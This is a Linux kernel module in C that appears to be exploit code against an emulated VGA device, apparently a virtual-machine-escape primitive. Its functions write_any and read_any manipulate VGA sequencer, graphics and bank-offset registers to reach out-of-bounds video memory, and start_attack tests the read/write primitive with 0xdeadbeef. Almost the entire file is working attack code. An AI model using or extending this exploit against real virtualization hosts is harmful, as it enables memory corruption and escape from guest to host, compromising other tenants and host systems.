#include <linux/module.h>
#include <linux/init.h>
#include <linux/delay.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <asm/io.h>

#define BASE_MEM 0xa0000
#define BASE_IO 0x3c0

void *base_mem;

const uint8_t gr_mask[16] = {
    0x0f, /* 0x00 */
    0x0f, /* 0x01 */
    0x0f, /* 0x02 */
    0x1f, /* 0x03 */
    0x03, /* 0x04 */
    0x7b, /* 0x05 */
    0x0f, /* 0x06 */
    0x0f, /* 0x07 */
    0xff, /* 0x08 */
    0x00, /* 0x09 */
    0x00, /* 0x0a */
    0x00, /* 0x0b */
    0x00, /* 0x0c */
    0x00, /* 0x0d */
    0x00, /* 0x0e */
    0x00, /* 0x0f */
};

/* force some bits to zero */
const uint8_t sr_mask[8] = {
    0x03,
    0x3d,
    0x0f,
    0x3f,
    0x0e,
    0x00,
    0x00,
    0xff,
};

void set_gr(u8 idx,u8 val){
    outb(idx,0x3ce);// set index
    outb(val,0x3cf);
}

void set_sr(u8 idx,u8 val){
    outb(idx,0x3c4);
    outb(val,0x3c5);
}

void set_bank_offset(int val){
    outw(0x5,0x1ce);
    val = val >> 16;
    outw(val,0x1cf);
}

void write_any(int offset,u32 val){
    u8 val1,val2,val3,val4;
    val1 = val & 0xFF;
    val2 = (val >> 8) & 0xFF;
    val3 = (val >> 16) & 0xFF;
    val4 = (val >> 24) & 0xFF;

    set_sr(2,0);// disable update memory access
    set_gr(0x6,0x1 << 2);// memory_map_mode
    set_gr(0x5,0x0);//s.gr[VGA_GFX_MODE]

    if(offset < 0){                     //do nothing
        set_bank_offset(offset << 16);
        offset = 0;
    }
    else{
        set_bank_offset(offset & 0xFF0000);
        offset = offset & 0xFFFF;
    }
    set_sr(2,1);
    writeb(val1,base_mem+offset);
    set_sr(2,2);
    writeb(val2,base_mem+offset);
    set_sr(2,4);
    writeb(val3,base_mem+offset);
    set_sr(2,8);
    writeb(val4,base_mem+offset);
}

static u32 read_any(int offset){
    u8 val1,val2,val3,val4;
    u32 val;
    set_sr(2,0);// disable update memory access
    set_gr(0x6,0x1 << 2);// memory_map_mode
    set_gr(0x5,0x0);//s.gr[VGA_GFX_MODE]

    if(offset < 0){                     //do nothing
        set_bank_offset(offset << 16);
        offset = 0;
    }
    else{
        set_bank_offset(offset & 0xFF0000);
        offset = offset & 0xFFFF;
    }
    set_gr(4,0);
    val1 = readb(base_mem+offset);
    set_gr(4,1);
    val2 = readb(base_mem+offset);
    set_gr(4,2);
    val3 = readb(base_mem+offset);
    set_gr(4,3);
    val4 = readb(base_mem+offset);
    val = (val4 << 24) | (val3 << 16) | (val2 << 8) | val1;
    return val;
}

static int start_attack(void){
    u32 data;
    base_mem = ioremap(BASE_MEM,0x20000);

    write_any(0x10010,0xdeadbeef);
    data = read_any(0x10010);
    // mdelay(3000);
    // writeb(0xab,base_mem+0xffff);
    printk("[*]data is:0x%x\n",data);
    return 0;
}

static void exit_attack(void){
	printk("exp exit.\n");
}

module_init(start_attack);
module_exit(exit_attack);

MODULE_LICENSE("GPL");